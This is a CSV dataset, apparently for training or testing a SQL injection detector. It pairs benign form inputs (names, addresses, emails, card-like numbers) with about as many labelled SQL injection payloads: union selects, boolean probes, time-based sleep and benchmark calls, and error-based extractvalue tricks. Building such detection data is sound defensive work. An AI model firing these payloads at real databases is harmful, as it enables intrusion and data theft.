Query,Label
"-3649"")) as eydu where 3220=3220 or elt(8705=1510,1510)--",1
"regimiento, 114,",0
1') and (3020=3020)*6703 and ('botl' like 'botl,1
7032,0
0142424343188697,0
"-8414%"") union all select 2795#",1
miramon@logiteclines.rs,0
"1%"" or 4240=(select 4240 from pg_sleep(5))--",1
tuamea@wave.com.by,0
operalo@canovash.vg,0
18726543n,0
t1iesti70,0
"1'||(select 'svgd' from dual where 5188=5188 union all select null,null,null,null,null#",1
"calle andavias s/n,",0
00903443a,0
4234394543607287,0
"1')) as ylyq where 2953=2953 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
godofredo,0
"1',(select 9100=('qqpjq'||(select case 9100 when 9100 then 1 else 0 end from rdb$database)||'qzvzq'))",1
yoe,0
"1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",1
fresia,0
al769i4,0
"diogenes 82,",0
"1 where 5925=5925 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
0614375180233873,0
kiam,0
collinson_butarinski@fernandosoto.il,0
puntallana,0
-4351') or 6525=9458,1
paulet ajau,0
81383348x,0
sarteneja,0
"-3737%"" union all select 4452,4452,4452#",1
undus de lerda,0
6596687598913643,0
"1' where 1673=1673 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
"1)));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((4537=4537",1
"-8094) or elt(1032=1032,3623) and (4569=4569",1
"1' where 9420=9420 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
"1%"" union all select null,null,null,null,null,null,null,null,null,null--",1
victoria de los angeles,0
03380,0
"1'))) union all select null,null,null--",1
felipe olvera s/n 4?g,0
c/ de la igualdad 191 8-h,0
cabot@eurograb.tel,0
crovetto roger,0
1764760587372326,0
18178277c,0
"1%"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""%""=""",1
roca,0
46194,0
6246,0
"-9281) where 8363=8363 or make_set(8220=5127,5127)--",1
pallen,0
guhl.monks@goscan.za,0
tie3t54,0
2a8um238638,0
lagrange@zaya.bt,0
1%'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
"avenida rafael cabrera, 24, 8?g",0
"1"";select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1
beaulieu,0
17740,0
c/ rio segura 76,0
villatobas,0
zamarroni aburto,0
16360,0
00863764e,0
l8ci7ic55,0
incisivo,0
"1"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""yzjl"" like ""yzjl",1
parmenia,0
1%') and 4061=2730#,1
1'+(select iowv where 6105=6105 and sleep(5)#,1
0755793804862737,0
asc60ca,0
rebolledo de la torre,0
guillena,0
8164,0
"1' where 4701=4701 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",1
87r5raviat8,0
beln,0
"1%""))) union all select null,null--",1
oda,0
jesusa,0
comba,0
37210,0
1'+(select tart where 9861=9861;begin dbms_lock.sleep(5); end--,1
landau silvestre,0
villargordo del cabriel,0
"1)) as qzmg where 4344=4344 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
"1"") and sleep(5) and (""fsuf"" like ""fsuf",1
"1"") where 8588=8588;select (case when (3217=8421) then 3217 else cast(1 as int)/(select 0 from dual) end) from dual--",1
4226046499602528,0
evin,0
"c/ alqueria de rubiols, s/n, 11?d",0
sonsoles,0
17403,0
1%')) or sleep(5) and (('%'=',1
